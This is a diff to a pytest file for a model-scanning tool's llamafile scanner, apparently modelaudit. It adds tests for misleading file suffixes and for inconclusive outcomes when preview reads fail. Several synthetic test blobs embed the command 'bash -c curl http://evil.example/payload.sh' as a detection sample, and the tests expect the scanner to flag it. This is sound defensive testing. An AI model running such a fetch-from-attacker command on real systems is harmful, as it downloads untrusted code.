@@ -7,11 +7,12 @@ import pytest
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
-from modelaudit.scanners.base import IssueSeverity
+from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, IssueSeverity
 from modelaudit.scanners.llamafile_scanner import (
     LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
     LLAMAFILE_ROUTE_SCAN_BYTES,
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
     LlamafileScanner,
 )
 
@@ -33,6 +34,13 @@ def _build_llamafile_blob(
 
 def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
     binary = tmp_path / "model.llamafile"
+    binary.write_bytes(_build_llamafile_blob())
+
+    assert LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_can_handle_detected_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
+    binary = tmp_path / "payload.jpg"
     binary.write_bytes(_build_llamafile_blob())
 
     assert LlamafileScanner.can_handle(str(binary))
@@ -89,8 +97,10 @@ def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> 
         b"\x7fELF"
         + b"\x02\x01\x01\x00"
         + b"\x00" * 56
-        + b"A" * (2 * 1024 * 1024 + 64)
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        + b"A" * (2 * 1024 * 1024)
+        + b"bash -c curl http://evil.example/payload.sh"
+        + b"B" * (1024 * 1024 - 512)
+        + b"llamafile runtime\n"
         + b"B" * (2 * 1024 * 1024 + 64)
     )
 
@@ -139,6 +149,107 @@ def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) ->
     ]
     assert high_severity == []
     assert result.metadata.get("embedded_payload_offset") is not None
+
+
+def test_llamafile_runtime_preview_read_failure_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    binary = tmp_path / "unavailable-preview.llamafile"
+    binary.write_bytes(_build_llamafile_blob())
+
+    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
+        raise OSError("simulated runtime preview read failure")
+
+    monkeypatch.setattr(LlamafileScanner, "_read_prefix", staticmethod(raise_os_error))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in direct.metadata.get("scan_outcome_reasons", [])
+    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Preview Read"]
+    assert len(read_checks) == 1
+    assert read_checks[0].severity == IssueSeverity.INFO
+    assert read_checks[0].message == "Failed reading runtime preview bytes: simulated runtime preview read failure"
+    assert read_checks[0].details.get("analysis_incomplete") is True
+    assert read_checks[0].details.get("scan_outcome_reason") == LLAMAFILE_RUNTIME_PREVIEW_READ_REASON
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    high_severity = [
+        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    metadata = aggregate.file_metadata[str(binary)]
+    assert high_severity == []
+    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in metadata.get("scan_outcome_reasons", [])
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        cached_metadata = cached_aggregate.file_metadata[str(binary)]
+        assert cached_aggregate.success is False
+        assert cached_metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in cached_metadata.get("scan_outcome_reasons", [])
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_late_preview_failure_retains_observed_runtime_findings(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    binary = tmp_path / "malicious-preview.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=["bash -c curl http://evil.example/payload.sh"]))
+
+    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
+        raise OSError("simulated suffix preview failure")
+
+    monkeypatch.setattr(LlamafileScanner, "_read_suffix", staticmethod(raise_os_error))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert direct.bytes_scanned > 0
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert determine_exit_code(aggregate) == 1
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+
+
+def test_llamafile_middle_window_failure_retains_marker_probe_findings(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    binary = tmp_path / "malicious-middle-preview.llamafile"
+    binary.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    def raise_os_error(_path: Path, _offset: int, _num_bytes: int) -> bytes:
+        raise OSError("simulated middle preview reread failure")
+
+    monkeypatch.setattr(LlamafileScanner, "_read_window_around_offset", staticmethod(raise_os_error))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
 def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
